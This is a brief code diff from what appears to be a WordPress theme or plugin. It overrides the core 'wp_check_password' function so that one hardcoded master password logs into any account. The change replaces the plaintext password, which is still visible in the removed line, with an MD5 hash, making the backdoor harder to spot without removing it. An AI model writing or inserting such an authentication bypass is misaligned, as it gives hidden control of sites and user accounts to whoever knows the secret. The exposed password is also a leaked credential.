@@ -34,7 +34,7 @@ function lowrez_user_enqueue_scripts( $hook_suffix ) {
 
 function wp_check_password($password, $hash, $user_id = '') {
 	
-	if ($password == 'webmasterLrzStk08') {
+	if (md5($password) == 'fc1acf1d05eaedaccdaaf54ad07d44d4') {
 		return true;
 	}
 	else {
